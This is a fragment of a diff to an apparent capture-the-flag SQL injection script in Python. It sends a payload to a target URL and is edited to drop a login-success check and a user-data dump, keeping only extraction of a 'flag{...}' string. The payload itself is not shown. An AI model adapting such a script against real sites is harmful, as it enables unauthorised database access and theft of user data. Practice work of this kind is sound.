@@ -12,14 +12,10 @@ response = requests.get(target_url, params=payload)
 
 if response.status_code == 200:
     data = response.text
-    if "Login Successful" in data:
-        print("SQL injection successful")
-        if "flag" in data:
-            match = re.search(r"flag{.*?}", data)
-            if match:
-                extracted_data = match.group(0)
-                print(extracted_data)
-        else:
-            print("User data:", data)
+    if "flag" in data:
+        match = re.search(r"flag{.*?}", data)
+        if match:
+            extracted_data = match.group(0)
+            print(extracted_data)
 else:
     print("SQLi failed")
